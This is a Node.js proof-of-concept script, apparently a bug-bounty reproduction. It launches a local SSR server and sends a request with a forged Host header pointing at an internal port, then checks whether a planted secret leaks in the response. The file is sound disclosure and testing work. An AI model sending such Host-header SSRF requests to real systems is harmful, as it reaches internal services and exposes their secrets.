const { spawn } = require('child_process');
const http = require('http');

const INTERNAL_SECRET = 'INTERNAL_SECRET_123';
const SSR_PORT = 4400;
const INTERNAL_PORT = 4401;

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function runExploit() {
  console.log('[TEST] Starting vulnerable SSR server...');
  
  const serverProcess = spawn('node', [
    'BugBounty/Repros/ssrf-ssr-app/server.js'
  ], {
    stdio: 'pipe',
    shell: false
  });

  serverProcess.stdout.on('data', (data) => {
    console.log(`[SERVER] ${data.toString().trim()}`);
  });

  serverProcess.stderr.on('data', (data) => {
    console.error(`[SERVER ERROR] ${data.toString().trim()}`);
  });

  // Wait for server to start
  await sleep(5000);

  console.log('\n[TEST] Sending exploit request...');
  console.log(`[TEST] Target: http://127.0.0.1:${SSR_PORT}/`);
  console.log(`[TEST] Malicious Host Header: 127.0.0.1:${INTERNAL_PORT}`);

  const options = {
    hostname: '127.0.0.1',
    port: SSR_PORT,
    path: '/',
    method: 'GET',
    headers: {
      'Host': `127.0.0.1:${INTERNAL_PORT}`
    }
  };

  const req = http.request(options, (res) => {
    let data = '';

    res.on('data', (chunk) => {
      data += chunk;
    });

    res.on('end', () => {
      console.log('\n[TEST] Response received:');
      console.log('----------------------------------------');
      console.log(data);
      console.log('----------------------------------------');

      if (data.includes(INTERNAL_SECRET)) {
        console.log('\n[SUCCESS] Vulnerability confirmed! Secret leaked in response.');
        console.log(`[SUCCESS] Found secret: ${INTERNAL_SECRET}`);
      } else {
        console.log('\n[FAILURE] Secret NOT found in response.');
      }

      // Cleanup
      serverProcess.kill();
      process.exit(data.includes(INTERNAL_SECRET) ? 0 : 1);
    });
  });

  req.on('error', (e) => {
    console.error(`[TEST ERROR] Request failed: ${e.message}`);
    serverProcess.kill();
    process.exit(1);
  });

  req.end();
}

runExploit();
